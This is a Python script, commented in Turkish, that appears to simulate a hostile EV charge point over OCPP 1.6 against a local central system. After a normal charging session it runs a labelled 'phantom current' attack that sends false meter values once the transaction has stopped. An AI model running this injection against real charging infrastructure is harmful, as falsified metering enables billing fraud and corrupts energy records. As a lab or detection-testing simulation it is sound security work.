import asyncio
import logging
import websockets
from datetime import datetime
from ocpp.v16 import ChargePoint as cp
# GÜNCEL VERSİYON IMPORTLARI (Payload kelimesi yok)
from ocpp.v16.call import BootNotification, StartTransaction, StopTransaction, MeterValues

logging.basicConfig(level=logging.INFO, format='%(asctime)s - CP (SALDIRGAN) - %(message)s')

class ChargePointClient(cp):
    async def send_boot_notification(self):
        # BootNotificationPayload -> BootNotification
        request = BootNotification(
            charge_point_model="PhantomSim-01",
            charge_point_vendor="SimulatedAttacker"
        )
        response = await self.call(request)
        if response.status == 'Accepted':
            logging.info("BootNotification başarılı.")

    async def start_charging_session(self):
        # StartTransactionPayload -> StartTransaction
        request = StartTransaction(
            connector_id=1,
            id_tag="User123",
            meter_start=10,
            timestamp=datetime.utcnow().isoformat()
        )
        logging.info("Şarj başlatılıyor...")
        response = await self.call(request)
        return response.transaction_id

    async def stop_charging_session(self, transaction_id):
        # StopTransactionPayload -> StopTransaction
        request = StopTransaction(
            meter_stop=12,
            timestamp=datetime.utcnow().isoformat(),
            transaction_id=transaction_id
        )
        logging.info("Şarj durduruluyor (StopTransaction gönderiliyor)...")
        await self.call(request)

    async def send_meter_value(self, value):
        # MeterValuesPayload -> MeterValues
        request = MeterValues(
            connector_id=1,
            meter_value=[{
                "timestamp": datetime.utcnow().isoformat(),
                "sampled_value": [{"value": str(value), "context": "Sample.Periodic", "format": "Raw", "measurand": "Energy.Active.Import.Register", "unit": "kWh"}]
            }]
        )
        await self.call(request)

async def main():
    # Bağlantı ayarları
    async with websockets.connect('ws://localhost:9000/CP_1', subprotocols=['ocpp1.6'], ping_interval=None) as ws:
        cp_instance = ChargePointClient('CP_1', ws)
        await asyncio.gather(cp_instance.start(), execute_scenario(cp_instance))

async def execute_scenario(cp_instance):
    # 1. Hazırlık
    await cp_instance.send_boot_notification()
    
    # 2. Normal Şarj Başlangıcı
    trans_id = await cp_instance.start_charging_session()
    
    for i in range(3):
        await asyncio.sleep(1)
        await cp_instance.send_meter_value(10.0 + (i * 0.5)) 
        logging.info(f"Normal Şarj Modu: Sayaç {10.0 + (i * 0.5)} kWh")

    # 3. Şarjı Durdur
    await cp_instance.stop_charging_session(trans_id)
    logging.info("--- İŞLEM DURDURULDU ---")
    
    # 4. SALDIRI: Hayalet Akım (Phantom Current)
    logging.info(">>> SALDIRI BAŞLIYOR: Hayalet Akım Simülasyonu <<<")
    
    phantom_meter_value = 12.00
    for _ in range(5): 
        await asyncio.sleep(2)
        phantom_meter_value += 0.01 
        logging.info(f"ANOMALİ ENJEKSİYONU: Sayaç {phantom_meter_value:.2f} kWh gönderiliyor")
        await cp_instance.send_meter_value(f"{phantom_meter_value:.2f}")

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("İstemci durduruldu.")
        